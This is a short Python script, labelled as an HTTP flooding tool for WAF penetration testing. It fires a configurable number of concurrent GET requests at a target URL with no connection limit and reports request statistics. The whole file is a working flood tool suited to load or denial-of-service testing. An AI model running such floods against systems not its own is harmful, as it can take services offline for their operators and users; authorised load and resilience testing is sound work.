import asyncio
import aiohttp
import argparse
import time

async def flood(url, session, stats):
    try:
        async with session.get(url) as resp:
            await resp.read()
            stats['success'] += 1
    except Exception as e:
        stats['fail'] += 1

async def main(url, total_requests, concurrency):
    stats = {'success': 0, 'fail': 0}
    sem = asyncio.Semaphore(concurrency)
    connector = aiohttp.TCPConnector(limit=0)  # unlimited OS-level connections

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []

        async def sem_flood():
            async with sem:
                await flood(url, session, stats)

        start_time = time.time()

        for _ in range(total_requests):
            task = asyncio.create_task(sem_flood())
            tasks.append(task)

        await asyncio.gather(*tasks)
        end_time = time.time()

        print(f"\nTotal Requests: {total_requests}")
        print(f"Successful: {stats['success']}")
        print(f"Failed: {stats['fail']}")
        print(f"Total Time: {end_time - start_time:.2f} seconds")
        print(f"Requests/sec: {total_requests / (end_time - start_time):.2f}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple HTTP Flooding Script for WAF Penetration Testing")
    parser.add_argument("url", help="Target URL, e.g., http://localhost:8080")
    parser.add_argument("-n", "--requests", type=int, default=1000, help="Total number of requests")
    parser.add_argument("-c", "--concurrency", type=int, default=100, help="Number of concurrent requests")

    args = parser.parse_args()

    asyncio.run(main(args.url, args.requests, args.concurrency))
